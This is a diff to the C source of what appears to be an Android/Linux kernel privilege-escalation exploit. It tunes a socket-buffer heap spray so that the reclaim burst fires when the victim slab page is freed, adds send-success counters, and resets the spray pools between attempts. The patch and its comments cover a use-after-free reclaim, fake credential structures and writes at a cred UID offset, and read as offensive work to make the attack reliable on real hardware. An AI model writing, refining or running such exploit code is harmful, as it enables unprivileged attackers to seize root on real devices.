@@ -1883,9 +1883,25 @@ static int stage_write(unsigned long long target, int mode,
 
 #define SPRAY_THREADS 8
 #define SPRAY_SOCKS 2048
-#define SPRAY_PRE 2000
-#define SPRAY_POST 10000
+/*
+ * Phase 1 pre-fills a small part of the pool before the target execs, which
+ * catches a free that happens early.  It must stay small: it consumes the
+ * same bounded queue capacity that the phase-2 burst needs at the free.
+ */
+#define SPRAY_PRE 256
+/* Phase-2 send budget per spray thread, spent once the free is observed. */
+#define SPRAY_POST 20000
+/* How long phase 2 waits for the parent's page_free before giving up. */
+#define SPRAY_WINDOW_MS 14000
 static _Atomic int g_burst, g_burst2, g_stop_spray;
+/* Set by the parent the moment page_free for the victim slab appears in the
+ * trace.  The spray holds its queue capacity until this is set and only then
+ * spends it, so the budget is still unused when the page becomes available.
+ */
+static _Atomic int g_free_seen;
+/* Spray accounting, logged once per plant: a burst that silently mostly
+ * failed (EAGAIN/ENOBUFS) cannot reclaim anything no matter how long it runs. */
+static _Atomic long g_send_ok, g_send_err;
 /*
  * Two spray pools.  pool_a is the scratch pool until the fake-cred stage
  * lands; its queued skbuffs then hold the page the child's cred points
@@ -2063,18 +2079,49 @@ static void *spray_thread(void *x)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
+        if (send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT) > 0)
+            atomic_fetch_add(&g_send_ok, 1);
+        else
+            atomic_fetch_add(&g_send_err, 1);
         w++;
     }
-    /* Phase 2 is released when the parent sees the victim page free. */
+    /*
+     * Phase 2 is the reclaim burst, and its timing is the whole trick.
+     *
+     * The queues hold a finite amount of payload.  An unprivileged process
+     * cannot raise net.core.wmem_max, so the pool keeps only a bounded number
+     * of skbs (measured on a boot with Android's 212992 default: successful
+     * sends stall around 57k, everything after that is EAGAIN).  Sending flat
+     * out therefore spends the entire capacity within a few milliseconds,
+     * while the victim slab is freed later, inside the child's exec/exit
+     * path.  By then every send fails and nothing of ours is allocating, so
+     * the page goes elsewhere: that was the hardware miss, `free_seen=1
+     * hit=0` with send errors in the millions.
+     *
+     * So hold the capacity back.  Wait until the parent has seen page_free
+     * for the victim slab, then spend the whole remaining budget at full
+     * speed.  The free is the only instant at which the page can be taken,
+     * and the parent stops the spray (g_stop_spray) as soon as it proves the
+     * reclaim, so a hit ends this early.
+     */
     while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
         sched_yield();
-    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
     {
-        int k = a->sock_first + (w % a->sock_count);
+        long t0 = now_ms();
 
-        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
-        w++;
+        while (!atomic_load(&g_free_seen) && !atomic_load(&g_stop_spray) &&
+               now_ms() - t0 < SPRAY_WINDOW_MS)
+            usleep(200);
+        while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
+        {
+            int k = a->sock_first + (w % a->sock_count);
+
+            if (send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT) > 0)
+                atomic_fetch_add(&g_send_ok, 1);
+            else
+                atomic_fetch_add(&g_send_err, 1);
+            w++;
+        }
     }
     return NULL;
 }
@@ -2377,6 +2424,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
     atomic_store(&g_burst, 0);
     atomic_store(&g_burst2, 0);
     atomic_store(&g_stop_spray, 0);
+    atomic_store(&g_free_seen, 0);
+    atomic_store(&g_send_ok, 0);
+    atomic_store(&g_send_err, 0);
     {
         int per = g_pool_n / SPRAY_THREADS;
 
@@ -2475,7 +2525,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     atomic_store(&g_burst2, 1);
     long t1 = now_ms();
-    int hit = 0;
+    int hit = 0, free_logged = 0;
 
     while (!hit && now_ms() - t1 < 15000)
     {
@@ -2486,8 +2536,19 @@ static void run_plant(unsigned long long target, int tag, int mode,
             if (m <= 0)
                 continue;
             scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
+            if (free_seen && !free_logged)
+            {
+                /* Diagnostic: when did the victim slab actually return, and
+                 * how much spray had been spent by then?  This separates
+                 * "free landed after the burst drained" from "free landed
+                 * while we were still allocating". */
+                free_logged = 1;
+                logf("[+] plant%d free at %ldms send ok=%ld err=%ld\n",
+                     tag, now_ms() - t1, atomic_load(&g_send_ok),
+                     atomic_load(&g_send_err));
+            }
             if (free_seen)
-                atomic_store(&g_burst2, 1);
+                atomic_store(&g_free_seen, 1);
         }
         if (!hit)
             usleep(50);
@@ -2504,8 +2565,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (m > 0)
             scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
     }
-    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
-         tag, free_seen, hit, now_ms() - t1);
+    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms send ok=%ld err=%ld\n",
+         tag, free_seen, hit, now_ms() - t1,
+         atomic_load(&g_send_ok), atomic_load(&g_send_err));
     if (!hit)
     {
         logf("[-] plant%d burst missed; holding zombie\n", tag);
@@ -3231,6 +3293,10 @@ int main(int argc, char **argv)
         for (int a = 0; a < 3 && !r.ok; a++)
         {
             logf("[+] permissive plant attempt %d/3\n", a + 1);
+            /* Fresh queues per attempt: a retry that starts inside the
+             * previous attempt's full queues sends only EAGAIN and can never
+             * reclaim the freed slab. */
+            pool_reset();
             run_plant(0, 1, 0, &r, raw);
         }
         if (!r.ok)
@@ -3250,6 +3316,10 @@ int main(int argc, char **argv)
         for (int a = 0; a < 3 && !r.ok; a++)
         {
             logf("[+] plant attempt %d/3\n", a + 1);
+            /* Same reason as the permissive path: each attempt needs empty
+             * queues, otherwise phase 1 fills them and the burst is all
+             * EAGAIN. */
+            pool_reset();
             run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
         }
         if (!r.ok)
